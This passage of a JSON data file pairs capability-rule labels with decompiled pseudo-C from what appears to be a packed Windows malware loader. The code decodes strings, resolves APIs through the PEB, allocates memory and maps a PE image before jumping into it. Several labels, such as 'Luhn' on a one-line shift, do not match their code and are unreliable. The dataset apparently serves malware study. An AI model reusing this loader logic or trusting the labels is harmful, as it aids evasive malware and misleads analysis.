puVar30;\n            ppuVar10 = ppuVar8;\n            ppuVar29 = ppuVar28;\n            if (-1 < ppuVar28) break;\n            out(extraout_DX_20, ppuVar8);\n            out(0xd0, ppuVar8);\n            ppuVar10 = ppuVar28;\n            ppuVar29 = ppuVar8;\n            if (ppuVar28 != NULL) break;\ncode_r0x00408c75:\n            uStack92 = 0x7c;\n            (*_sym.imp.KERNEL32.dll_GetVolumePathNamesForVolumeNameW)();\n            puVar9 = *ppuVar28;\n            puVar23 = ppuVar28 + 1 + puVar30;\n            puVar24 = puVar9;\n            puVar25 = puVar23;\n            if (puVar23 < 0) {\n                out(extraout_DX_07, puVar9);\n                out(0xd0, puVar9);\n                puVar24 = puVar23;\n                puVar25 = puVar9;\n                if (puVar23 == NULL) {\n                    puVar9 = puVar9 & 0xffffff20;\n                    goto code_r0x00408cd4;\n                }\n            }\n            out(0xd7, puVar24);\n            uStack92 = 0x9e;\n            uVar4 = func_0x42654e85();\n            puVar25[0x2098fed8] = puVar25[0x2098fed8] & uVar4 >> 8;\n            in_AF = 9 < (uVar4 & 0xf) | in_AF;\ncode_r0x00408ca6:\n            ppuVar5 = CONCAT22(0x40, CONCAT11(0x8c, uStack92));\n            *0x6bdb02a6 = *0x6bdb02a6 & ppuVar5;\n        }\n        out(0xd7, ppuVar10);\n        uStack92 = 0;\n        uStack91 = 0x91;\n        puVar7 = func_0x426552e7();\n        *(ppuVar29 + 0x8263fb6) = *(ppuVar29 + 0x8263fb6) & puVar7 >> 8;\ncode_r0x00409107:\n        in_AF = 9 < (puVar7 & 0xf) | in_AF;\n        ppuVar21 = CONCAT22(0x40, CONCAT11(uStack91, uStack92));\n        *0x6bdb02a6 = *0x6bdb02a6 & ppuVar21;\n        goto code_r0x00408d42;\n    }\n    goto code_r0x00409087;\ncode_r0x00408e24:\n    *puVar30 = *puVar30 & 0xbe;\n    ppuVar21 = CONCAT22(0x40, CONCAT11(uStack91, uStack92));\n    *0x6bdb02a6 = *0x6bdb02a6 & ppuVar21;\n    if (ppuStack48 == NULL) {\ncode_r0x00409012:\n        (*_sym.imp.KERNEL32.dll_GlobalFree)();\n        ppuVar5 = *ppuVar21;\n        ppuVar21 = ppuVar21 + 1 + puVar30;\n        ppuVar19 = ppuVar5;\n        ppuVar26 = ppuVar21;\n        if (ppuVar21 < 0) {\n            out(extraout_DX_17, ppuVar5);\n            out(0xd0, ppuVar5);\n            ppuVar19 = ppuVar21;\n            ppuVar26 = ppuVar5;\n            if (ppuVar21 == NULL) goto code_r0x00409087;\n        }\n        out(0xd7, ppuVar19);\n        uVar4 = func_0x42655222();\n        *(ppuVar26 + 0x8263fb6) = *(ppuVar26 + 0x8263fb6) & uVar4 >> 8;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        *0x6bdb02a6 = *0x6bdb02a6 & ppuStack88;\n        ppuVar5 = ppuStack88;\ncode_r0x0040904a:\n        ppuStack88 = 0x409051;\n        (*_sym.imp.GDI32.dll_GetRegionData)();\n        ppuVar19 = *ppuVar5;\n        ppuVar21 = ppuVar5 + 1 + puVar30;\n        ppuVar5 = ppuVar19;\n        ppuVar26 = ppuVar21;\n        if (ppuVar21 < 0) {\n            out(extraout_DX_18, ppuVar19);\n            out(0xd0, ppuVar19);\n            ppuVar5 = ppuVar21;\n            ppuVar26 = ppuVar19;\n            if (ppuVar21 == NULL) goto code_r0x00408bc5;\n        }\n        out(0xd7, ppuVar5);\n        uVar4 = func_0x4265525a();\n        *(ppuVar26 + 0x8263fb6) = *(ppuVar26 + 0x8263fb6) & uVar4 >> 8;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        ppuVar28 = 0x409073;\n        *0x6bdb02a6 = *0x6bdb02a6 & 0x409073;\n        goto code_r0x00408cfd;\n    }\n    goto code_r0x00408bc5;\ncode_r0x00408c20:\n    uStack92 = 0x27;\n    uStack91 = 0x8c;\n    (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)();\n    puVar24 = puVar30 + 0x408fbf;\n    puVar9 = *0x408fbb;\n    puVar23 = puVar24;\n    if (puVar24 < 0) {\n        out(extraout_DX_06, *0x408fbb);\n        out(0xd0, *0x408fbb);\n        puVar9 = puVar24;\n        puVar23 = *0x408fbb;\n        if (puVar24 == NULL) {\n            puVar30 = puVar30 + 1;\n            *puVar30 = *puVar30 & 0xbe;\n            goto code_r0x00408ca6;\n        }\n    }\n    out(0xd7, puVar9);\n    uVar4 = func_0x42654e30();\n    puVar23[0x2098fed8] = puVar23[0x2098fed8] & uVar4 >> 8;\n    in_AF = 9 < (uVar4 & 0xf) | in_AF;\ncode_r0x00408c51:\n    ppuVar21 = CONCAT22(0x40, CONCAT11(uStack91, uStack92));\n    *0x6bdb02a6 = *0x6bdb02a6 & ppuVar21;\n    puStack56 = 0xfffffffd;\n    if ((ppuStack48 & 1) != 0) {\n        return 0xfffffffd;\n    }\n    goto code_r0x00408bc5;\n}\n",
        "token_count": 11302
    },
    "004078c8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004078c8(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t in_FS_OFFSET;\n    uint uVar6;\n    uint32_t uStack288;\n    uint auStack280 [3];\n    uchar auStack268 [172];\n    uint32_t uStack96;\n    uchar *puStack92;\n    uint *puStack88;\n    uint32_t uStack84;\n    uint32_t uStack80;\n    uint uStack76;\n    uint32_t uStack72;\n    int32_t iStack64;\n    uint32_t uStack56;\n    uint uStack52;\n    uint32_t uStack48;\n    uint uStack44;\n    int32_t iStack32;\n    uint uStack24;\n    uint uStack20;\n    uint var_8h;\n    \n    uStack20 = 0;\n    uStack24 = 0x4f5478cc;\n    uStack44 = CONCAT13(0xe6, uStack44);\n    uStack44 = CONCAT22(uStack44._2_2_, 0x9171);\n    uStack48 = 0xd00a568;\n    uStack80 = 0x23e93248;\n    uStack76 = 0;\n    uVar6 = 0;\n    auStack280[0] = 0x4f5478cc;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    iVar2 = *(in_FS_OFFSET + 0x18);\n    if (5 < *(*(iVar2 + 0x30) + 0xa4)) {\n        iVar3 = fcn.004096c6();\n        iStack64 = 0;\n        if (*(iVar3 + *(iVar3 + 0x3c)) == 0x4550) {\n            iStack64 = iVar3 + *(iVar3 + 0x3c);\n        }\n        uVar1 = *(iStack64 + 0x48);\n        uStack56 = uStack56 & 0xffff | uVar1 << 0x10;\n        if (((5 < uVar1) && (uVar1 != 6 || *(iStack64 + 0x4a) != -0x6e8f - uStack48)) &&\n           (uVar4 = uStack52 ^ 0xd00a568,  uVar5 = fcn.00409542(),  uVar5 == uVar4)) {\n            (*_sym.imp.GDI32.dll_MoveToEx)(0x1b12e9, 0xae0, 0xccb, auStack280);\n        }\n    }\n    puStack92 = auStack268;\n    puStack88 = &uStack76;\n    uStack72 = 0;\n    do {\n        uStack96 = uStack72;\n        (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        iVar3 = uStack96 % 100 + uStack96 * 2 + (uStack96 / 5 & 0x3ffffffe) * -5;\n        if (iVar3 == 4) {\n            if (uStack96 < 100) {\n                uStack76 = 0x180;\n                (*_sym.imp.KERNEL32.dll_GetNamedPipeClientProcessId)(0x267261, &uStack76);\n            }\n        }\n        else if (iVar3 == 0x2b) {\n            (*_sym.imp.KERNEL32.dll_GetTimeZoneInformation)(auStack268);\n        }\n        else if ((iVar3 == 0x5d) && ((uStack84 ^ 0x711abad8 | uStack80) != 0)) {\n            (*_sym.imp.KERNEL32.dll_WinExec)(0x40772a, 0x674);\n        }\n        else {\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetStringScripts)\n                              (0xecf, 0x40774c, 0xd00b42a - uStack52, 0x407736, 0xd00b42a - uStack52);\n            (*_sym.imp.ole32.dll_CoInvalidateRemoteMachineBindings)(0x407762);\n        }\n        uStack72 = uStack96 + 1;\n        iStack32 = iVar2;\n    } while (uStack72 != 0x82);\n    (*_sym.imp.GDI32.dll_GdiSetBatchLimit)(uStack52 ^ 0xd00aa63, uVar6);\n    if ((uStack56 ^ 0xd00a56e) <= *(*(*(in_FS_OFFSET + 0x18) + 0x30) + 0xa4)) {\n        iVar2 = fcn.004096c6();\n        iStack64 = 0;\n        if (*(iVar2 + *(iVar2 + 0x3c)) == (uStack56 ^ 0xd00e038)) {\n            iStack64 = iVar2 + *(iVar2 + 0x3c);\n        }\n        uStack48 = uStack288 & 0x679ca7c;\n        uStack44 = 0;\n        uVar1 = *(iStack64 + 0x48);\n        uStack72 = uStack72 & 0xffff | uVar1 << 0x10;\n        if (((5 < uVar1) && (uVar1 != 0x9177U - uStack52 || *(iStack64 + 0x4a) != 0)) &&\n           (iVar2 = fcn.00409542(),  iVar2 == 0)) {\n            fcn.00409c80();\n            return 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_Wow64EnableWow64FsRedirection)(-0x13 - uStack52._3_1_);\n    return 0x62;\n}\n",
        "token_count": 1320
    },
    "00407e73": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00407e73(int32_t arg_8h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uStack112;\n    uint16_t *puStack100;\n    uint32_t uStack96;\n    uint var_ch;\n    \n    iVar4 = fcn.004096c6();\n    iVar5 = 0;\n    if (*(iVar4 + *(iVar4 + 0x3c)) == 0x4550) {\n        iVar5 = iVar4 + *(iVar4 + 0x3c);\n    }\n    iVar5 = *(iVar5 + 0x78);\n    uVar3 = *(iVar4 + 0x18 + iVar5);\n    if (uVar3 != 0) {\n        puStack100 = iVar4 + *(iVar4 + iVar5 + 0x24);\n        uStack96 = 0;\n        do {\n            uStack112 = 0;\n            do {\n                cVar1 = *(arg_8h + uStack112);\n                cVar2 = *(iVar4 + *(iVar4 + *(iVar4 + 0x20 + iVar5) + uStack96 * 4) + uStack112);\n                if (cVar2 == '\\0') break;\n                uStack112 = uStack112 + 1;\n            } while ((cVar2 == cVar1 && cVar1 != '\\0') && uStack112 < 0x20);\n            if (cVar2 == cVar1) {\n                return iVar4 + *(iVar4 + *(iVar4 + iVar5 + 0x1c) + *puStack100 * 4);\n            }\n            uStack96 = uStack96 + 1;\n            puStack100 = puStack100 + 1;\n        } while (uStack96 < uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 441
    },
    "004082a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.004082a4(int32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int16_t iVar3;\n    int32_t in_FS_OFFSET;\n    bool bVar4;\n    uint32_t uStack84;\n    uint var_ch;\n    \n    iVar1 = *(*(*(in_FS_OFFSET + 0x18) + 0x30) + 0xc);\n    puVar2 = *(iVar1 + 0x14);\n    while( true ) {\n        if (puVar2 == iVar1 + 0x14) {\n            return NULL;\n        }\n        if (arg_ch != NULL && puVar2[4] == arg_ch) break;\n        uStack84 = 0;\n        if (*(puVar2 + 9) >> 1 != 0) {\n            do {\n                iVar3 = *(puVar2[10] + uStack84 * 2);\n                if (iVar3 - 0x41U < 0x1a) {\n                    iVar3 = iVar3 + 0x20;\n                }\n                bVar4 = *(arg_8h + uStack84 * 2) == iVar3;\n                uStack84 = uStack84 + 1;\n            } while ((bVar4 && iVar3 != 0) && uStack84 < *(puVar2 + 9) >> 1);\n            if (bVar4) {\n                return puVar2[4];\n            }\n        }\n        puVar2 = *puVar2;\n    }\n    return puVar2 + -2;\n}\n",
        "token_count": 365
    },
    "00409ddf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t fcn.00409ddf(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar auVar4 [12];\n    uchar auVar6 [16];\n    int32_t iStack180;\n    uint32_t uStack172;\n    int32_t iStack164;\n    int32_t iStack156;\n    int32_t iStack152;\n    uint64_t auStack140 [4];\n    uint32_t uStack108;\n    int16_t aiStack104 [32];\n    int32_t iStack40;\n    int32_t iStack36;\n    uint32_t uStack32;\n    uint uStack24;\n    uint var_bp_ch;\n    uchar auVar5 [13];\n    uchar uVar7;\n    \n    uVar2 = uStack32;\n    iStack36 = 0x1c527801;\n    uStack172 = 6;\n    while( true ) {\n        iStack164 = iStack180;\n        uStack108 = uStack172;\n        iStack152 = 0;\n        do {\n            *(auStack140 + iStack152) = *(iStack152 + 0x4076bb) - *(iStack152 + 0x407719);\n            iStack152 = iStack152 + 1;\n            iStack156 = 0;\n        } while (iStack152 != 0xe);\n        do {\n            iVar3 = 0x1c527821 - iStack36;\n            uStack32 = uVar2 ^ 0x28a27173;\n            uVar1 = *(auStack140 + iStack156);\n            uVar7 = SUB141(ZEXT814(uVar1) >> 0x30, 0);\n            auVar5 = ZEXT813(uVar1);\n            auVar4 = ZEXT812(uVar1);\n            auVar6 = psraw(CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(SUB1610(\n                                                            CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(\n                                                            SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313(SUB163(\n                                                            CONCAT214(SUB162(CONCAT115(SUB161(ZEXT816(uVar1) >> 0x38, 0)\n                                                                                       , CONCAT114(SUB151(ZEXT815(uVar1)\n                                                                                                          >> 0x38, 0), \n                                                                                                   ZEXT814(uVar1))) >>\n                                                                             0x70, 0), CONCAT113(uVar7, auVar5)) >> 0x68\n                                                            , 0), CONCAT112(uVar7, auVar4)) >> 0x60, 0), \n                                                            CONCAT111(SUB131(auVar5 >> 0x28, 0), ZEXT811(uVar1))) >>\n                                                            0x58, 0), CONCAT110(SUB121(auVar4 >> 0x28, 0), uVar1)) >>\n                                                            0x50, 0), CONCAT19(SUB131(auVar5 >> 0x20, 0), uVar1)) >>\n                                                            0x48, 0), CONCAT18(SUB121(auVar4 >> 0x20, 0), uVar1)) >>\n                                                            0x40, 0), (uVar1 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (uVar1 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (uVar1 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (uVar1 >> 0x10) << 0x20) >> 0x20, 0), (uVar1 >> 8) << 0x18)\n                                                            >> 0x18, 0), (uVar1 >> 8) << 0x10) >> 0x10, 0), \n                                     uVar1 & 0xff | uVar1 << 8), 8);\n            *(aiStack104 + iStack156) = auVar6;\n            iStack156 = iStack156 + 8;\n        } while (iStack156 != iVar3);\n        iStack40 = 0;\n        if (aiStack104[0] == 0) break;\n        if (uStack108 < 5) {\n            iStack164 = fcn.004082a4(aiStack104, 0);\n        }\n        uStack172 = uStack108 - 1;\n        iStack180 = iStack164;\n        if (uStack172 < 2) {\n            iStack40 = 0;\n            if (iStack164 + *(iStack164 + 0x3c) != 0 && *(iStack164 + *(iStack164 + 0x3c)) == 0x4550) {\n                iStack40 = iStack164;\n            }\n            return iStack40;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1133
    },
    "0040788e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040788e(int32_t *arg_8h)\n\n{\n    return *arg_8h << 1;\n}\n",
        "token_count": 35
    },
    "00408717": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.00408717(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t iStack320;\n    uint8_t auStack304 [77];\n    uchar uStack227;\n    int32_t iStack48;\n    int32_t iStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint var_bp_ch;\n    \n    uVar5 = uStack32;\n    uStack40 = 0x2bdb52a1;\n    iStack44 = 0x4cb1607b;\n    iStack320 = 0;\n    do {\n        uVar9 = *(iStack320 * 4 + 0x4129b8);\n        if (iStack44 != 0x37512c4d) {\n            for (; uVar9 < arg_10h; uVar9 = uVar9 + uVar8) {\n                uVar2 = *(*0x4129b4 + uVar9 % 0x29);\n                uVar6 = uVar9 * iStack320 + 4;\n                uVar3 = auStack304[uVar6];\n                uVar8 = uStack40 ^ 0x2bdb5284;\n                uStack36 = arg_10h | 0x521be4fd;\n                uStack32 = uVar5 ^ 0x1dbbb05a;\n                *(arg_8h + uVar9) = *(arg_ch + uVar9) - uVar2;\n                auStack304[uVar6] = uVar3 + 1 ^ uVar2;\n            }\n        }\n        uStack227 = 0;\n        iStack320 = iStack320 + 1;\n        iStack48 = 0;\n        uStack36 = arg_10h >> 0x1b;\n    } while (iStack320 != 0x25);\n    do {\n        iVar4 = iStack48;\n        puVar1 = auStack304 + iStack48;\n        iStack48 = iStack48 + 1;\n    } while (*puVar1 != 0);\n    uVar7 = 0;\n    if (iVar4 == 0x100) {\n        uVar7 = 0x42;\n    }\n    return uVar7;\n}\n",
        "token_count": 595
    },
    "0040806a": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.0040806a(uint arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint uStack116;\n    uint uStack112;\n    uint32_t uStack100;\n    ushort uStack80;\n    ushort uStack78;\n    int32_t iStack76;\n    uint uStack72;\n    char acStack68 [32];\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint uStack24;\n    uint var_bp_ch;\n    \n    uStack36 = 0x3d4f4c8d;\n    uStack100 = 0;\n    do {\n        acStack68[uStack100] = *(uStack100 + 0x4076c9) - *((uStack100 & 0xf) + 0x407719);\n        uStack100 = uStack100 + 1;\n    } while (uStack100 != 0x18);\n    uStack116 = 0;\n    if (arg_ch != 0) {\n        pcVar4 = fcn.00407e73(acStack68);\n        uStack24 = 0x2d2080b;\n        uStack116 = 0;\n        if (pcVar4 != NULL) {\n            iStack76 = arg_ch;\n            uVar5 = uStack28 >> (uStack32 & 0x1f);\n            uVar1 = uStack32 & 0x1f;\n            uVar2 = uStack28 << 0x20 - uVar1;\n            uVar3 = uStack32 & 0x20;\n            uStack28 = uVar5;\n            uStack32 = uStack32 >> uVar1 | uVar2;\n            if (uVar3 != 0) {\n                uStack28 = 0;\n                uStack32 = uVar5;\n            }\n            uVar2 = 0;\n            do {\n                uVar6 = uVar2;\n                uVar5 = uStack32 << (uStack32 & 0x1f);\n                uVar1 = uStack32 & 0x1f;\n                uVar2 = uStack32 >> 0x20 - uVar1;\n                uVar3 = uStack32 & 0x20;\n                uStack32 = uVar5;\n                uStack28 = uStack28 << uVar1 | uVar2;\n                if (uVar3 != 0) {\n                    uStack32 = 0;\n                    uStack28 = uVar5;\n                }\n                uVar2 = uVar6 + 1;\n            } while (*(arg_ch + uVar6) != '\\0');\n            uStack80 = uVar6;\n            uStack112 = 0;\n            if ((uVar6 & (uStack36 ^ 0x3d4fb372)) != 0) {\n                uStack72 = 0;\n                uStack78 = uStack80;\n                (*pcVar4)(arg_8h, &uStack80, 0, &uStack72, uVar6 + 1, &uStack80);\n                uStack112 = uStack72;\n            }\n            uStack116 = uStack112;\n        }\n    }\n    return uStack116;\n}\n",
        "token_count": 763
    },
    "00409c80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint fcn.00409c80(void)\n\n{\n    code *pcVar1;\n    code *pcStack176;\n    uint auStack152 [2];\n    uint uStack144;\n    int32_t iStack136;\n    uchar auStack132 [40];\n    uint uStack92;\n    uint uStack88;\n    int16_t *piStack68;\n    uint uStack64;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_bp_4h;\n    \n    iStack136 = fcn.0040916a(auStack152);\n    uStack92 = auStack152[0];\n    uStack88 = 0x12a00;\n    uStack32 = *0x4129a4;\n    uStack36 = *0x4129a0;\n    uStack40 = *0x4129ac;\n    uStack28 = *0x4129a8;\n    uStack44 = *0x4129b0;\n    pcStack176 = fcn.0040966f;\n    do {\n        piStack68 = pcStack176;\n        if (*pcStack176 == 0x5a4d) {\n            uStack20 = 0;\n            uStack24 = 0;\n            if (*(pcStack176 + *(pcStack176 + 0x3c)) == 0x4550) {\n                iStack136 = iStack136 * 2;\n                uStack64 = *(pcStack176 + *(pcStack176 + 0x3c) + 0x50);\n                pcVar1 = fcn.00409a3d(auStack132, uStack144);\n                (*pcVar1)(auStack132);\n                return 1;\n            }\n        }\n        pcStack176 = pcStack176 + -0x1000 & 0xfffff000;\n    } while( true );\n}\n",
        "token_count": 446
    },
    "00407e3b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407e3b(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    \n    var_ch = 0;\n    iVar1 = var_ch;\n    do {\n        var_ch = iVar1;\n        iVar1 = var_ch + 1;\n    } while (*(arg_8h + var_ch) != '\\0');\n    return var_ch;\n}\n",
        "token_count": 108
    },
    "00408517": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Removing unreachable block (ram,0x0040861c)\n\nint16_t * __cdecl fcn.00408517(int32_t arg_8h)\n\n{\n    int16_t *piStack40;\n    code *pcStack36;\n    uint var_4h;\n    \n    pcStack36 = fcn.0040966f;\n    if (arg_8h == 0) {\n        for (; (*pcStack36 != 0x5a4d || (piStack40 = pcStack36,  *(pcStack36 + *(pcStack36 + 0x3c)) != 0x4550));\n            pcStack36 = pcStack36 + -0x1000 & 0xfffff000) {\n        }\n    }\n    else {\n        piStack40 = fcn.004082a4(arg_8h, 0);\n    }\n    return piStack40;\n}\n",
        "token_count": 210
    },
    "00408632": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.00408632(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uStack36;\n    uint var_bp_8h;\n    \n    uStack36 = 0;\n    if (arg_10h != 0) {\n        do {\n            *(arg_8h + uStack36) = *(arg_ch + uStack36) - *((uStack36 & 0xf) + 0x407719);\n            uStack36 = uStack36 + 1;\n        } while (uStack36 != arg_10h);\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "00409471": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004094d8)\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t __cdecl fcn.00409471(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iStack52;\n    uint var_bp_ch;\n    \n    iStack52 = 0;\n    if (arg_10h != 0) {\n        do {\n            *(arg_8h + iStack52) = *(arg_ch + iStack52);\n            iStack52 = iStack52 + 1;\n        } while (iStack52 != arg_10h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 159
    },
    "00409764": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00409862)\n// WARNING: Removing unreachable block (ram,0x0040988d)\n\nvoid __cdecl fcn.00409764(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uStack120;\n    int32_t iStack112;\n    int32_t iStack100;\n    uint16_t uStack82;\n    uint16_t uStack74;\n    int32_t iStack56;\n    uint var_ch;\n    \n    iVar4 = 0;\n    if (*(arg_ch + *(arg_ch + 0x3c)) == 0x4550) {\n        iVar4 = arg_ch + *(arg_ch + 0x3c);\n    }\n    uStack82 = *(iVar4 + 6);\n    if (uStack82 != 0) {\n        iStack56 = *(iVar4 + 0x14) + 0x18 + iVar4;\n        uStack120 = 0;\n        do {\n            iVar1 = *(iStack56 + 0xc);\n            uStack74 = uStack82;\n            iVar2 = *(iStack56 + 0x10);\n            iVar3 = *(iStack56 + 0x14);\n            iStack100 = 0;\n            if (iVar2 != 0) {\n                do {\n                    *(arg_8h + iVar1 + iStack100) = *(arg_ch + iVar3 + iStack100);\n                    iStack100 = iStack100 + 1;\n                } while (iStack100 != iVar2);\n                uStack74 = *(iVar4 + 6);\n            }\n            uStack120 = uStack120 + 1;\n            iStack56 = iStack56 + 0x28;\n            uStack82 = uStack74;\n        } while (uStack120 < uStack74);\n    }\n    iVar4 = *(iVar4 + 0x54);\n    iStack112 = 0;\n    if (iVar4 != 0) {\n        do {\n            *(arg_8h + iStack112) = *(arg_ch + iStack112);\n            iStack112 = iStack112 + 1;\n        } while (iStack112 != iVar4);\n    }\n    return;\n}\n",
        "token_count": 525
    },
    "00409a3d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Removing unreachable block (ram,0x00409c39)\n// WARNING: Removing unreachable block (ram,0x00409c6b)\n// WARNING: Removing unreachable block (ram,0x00409ad9)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00409a3d(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iStack136;\n    uint uStack132;\n    int32_t iStack100;\n    char acStack72 [24];\n    ulong uStack48;\n    uint uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    int32_t iStack24;\n    uint var_8h;\n    \n    iStack24 = 0xeaf1f10;\n    uStack36 = 0;\n    uStack40 = 0x3bb26602;\n    iStack100 = 0;\n    do {\n        uStack32 = uStack32 ^ 0x6bc4c922;\n        acStack72[iStack100] = *(iStack100 + 0x4076e1) - *(iStack100 + 0x407719);\n        iStack100 = iStack100 + 1;\n    } while (iStack100 != 0xe);\n    arg_8h_00 = fcn.00409ddf();\n    iVar2 = 0xeaf1f50 - iStack24;\n    pcVar1 = fcn.0040806a(arg_8h_00, acStack72);\n    iVar2 = (*pcVar1)(0, 0x19000, 0x1000, iVar2);\n    uStack48 = CONCAT44(~uStack48._4_4_, ~uStack48);\n    iStack100 = 0;\n    if (iVar2 != 0) {\n        fcn.00409764(iVar2, uStack132);\n        *(iStack136 + 0x48) = iVar2;\n        *(iStack136 + 0x4c) = iVar2 + -0x400000;\n        iStack100 = iVar2 + 0x29d7;\n    }\n    return iStack100;\n}\n",
        "token_count": 511
    },
    "00407808": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
